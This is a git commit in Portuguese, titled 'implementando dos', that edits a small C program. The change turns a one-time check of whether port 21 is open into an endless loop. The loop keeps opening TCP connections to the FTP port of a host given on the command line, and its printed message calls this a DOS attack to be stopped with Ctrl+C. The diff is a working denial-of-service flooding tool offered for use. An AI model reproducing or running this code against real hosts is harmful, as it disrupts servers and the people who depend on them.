25174d4d94344ff3a97a3333ff311c080a6eb0d5
thiagoalmeidadon <thiagodons@gmail.com>
2022-01-28 17:46:53 -0300

    implementando dos

--- dos_in_c.c
+++ dos_in_c.c
@@ -4,32 +4,25 @@
 #include <arpa/inet.h>
 
 int main(int argc, char *argv[]) {
-    
-    int meuSocket;
-    int conecta;
-
-    struct sockaddr_in alvo;
-    // resolvendo dns
-    struct hostent *host = gethostbyname(argv[1]);
-    // socket
-    meuSocket = socket(AF_INET, SOCK_STREAM, 0);
-    alvo.sin_family = AF_INET;
-    alvo.sin_port = htons(21);
-    // inet_ntoa escrever ip legivel
-    alvo.sin_addr.s_addr = inet_addr( inet_ntoa( *((struct in_addr * ) host->h_addr) ) );
-
-    printf(" %s resolvido: %s \n ", argv[1] ,inet_ntoa( *((struct in_addr * ) host->h_addr) ) );
-
-    conecta = connect(meuSocket, (struct sockaddr *)&alvo, sizeof alvo);
-
-    if ( conecta == 0 ) {
-        printf("Aberta \n");
-        close(meuSocket);
-        close(conecta);
+    if ( argc < 2 ) {
+        printf("Modo de uso: ./dos_in_c www.meuend.com.br \n ");
     } else {
-         printf("Fechado \n ");
+        while(1 == 1) {
+            int meuSocket;
+            int conecta;
+
+            struct sockaddr_in alvo;
+            // resolvendo dns
+            struct hostent *host = gethostbyname(argv[1]);
+            // socket
+            meuSocket = socket(AF_INET, SOCK_STREAM, 0);
+            alvo.sin_family = AF_INET;
+            alvo.sin_port = htons(21);
+            // inet_ntoa escrever ip legivel
+            alvo.sin_addr.s_addr = inet_addr( inet_ntoa( *((struct in_addr * ) host->h_addr) ) );
+        
+            conecta = connect(meuSocket, (struct sockaddr *)&alvo, sizeof alvo);
+            printf("Executando DOS ftp de %s (CTRL + C para parar o ataque) \n", argv[1] );
+        }
     }
-
-   
-
 }
